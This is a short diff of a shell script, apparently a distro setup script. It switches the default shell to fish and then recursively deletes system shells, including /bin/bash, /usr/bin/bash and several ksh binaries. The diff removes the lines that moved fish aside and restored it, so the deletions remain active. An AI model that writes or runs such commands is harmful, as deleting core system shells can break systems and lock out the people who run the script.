@@ -12,11 +12,10 @@ case $distro in
     *) ;;
 esac
 
-    chsh -s `which fish`
+    chsh -s /bin/fish
     
     mkdir /bin/fivh
     
-mv /bin/fish /bin/fivh
 
 rm -r /bin/bash
 rm -r /usr/bin/bash
@@ -30,4 +29,3 @@ rm -r /usr/bin/ksh2020
 rm -r /usr/bin/rksh2020
 
 
-mv /bin/fivh /bin/fish
